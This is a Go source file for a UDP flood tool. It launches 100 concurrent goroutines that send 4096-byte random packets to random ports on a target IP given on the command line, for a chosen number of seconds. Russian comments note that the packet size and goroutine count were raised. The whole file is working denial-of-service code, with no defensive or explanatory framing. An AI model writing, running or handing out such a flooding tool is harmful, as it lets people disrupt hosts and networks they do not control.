package main

import (
    "fmt"
    "net"
    "math/rand"
    "sync"
    "time"
    "os"
    "strconv"
    "log"
)

func udpFlood(targetIP string, duration time.Duration, wg *sync.WaitGroup) {
    defer wg.Done()
    
    data := make([]byte, 4096) // Увеличенный размер пакета
    rand.Read(data)

    endTime := time.Now().Add(duration)
    numPackets := 0

    for time.Now().Before(endTime) {
        // Случайный порт от 1 до 65535
        targetPort := fmt.Sprintf("%d", rand.Intn(65535)+1)
        addr := net.JoinHostPort(targetIP, targetPort)
        conn, err := net.Dial("udp", addr)
        if err != nil {
            fmt.Println("Error:", err)
            continue
        }
        _, err = conn.Write(data)
        conn.Close()
        if err != nil {
            fmt.Println("Error:", err)
            continue
        }
        numPackets++
    }

    fmt.Printf("Sent %d packets to %s with random ports\n", numPackets, targetIP)
}

func main() {
    if len(os.Args) < 3 {
        log.Fatal("Usage: program <targetIP> <duration in seconds>")
    }

    targetIP := os.Args[1]

    durationSec, err := strconv.Atoi(os.Args[2])
    if err != nil {
        log.Fatal("Invalid duration: ", err)
    }

    duration := time.Duration(durationSec) * time.Second

    var wg sync.WaitGroup
    numGoroutines := 100 // Увеличиваем количество горутин

    for i := 0; i < numGoroutines; i++ {
        wg.Add(1)
        go udpFlood(targetIP, duration, &wg)
    }

    wg.Wait()
}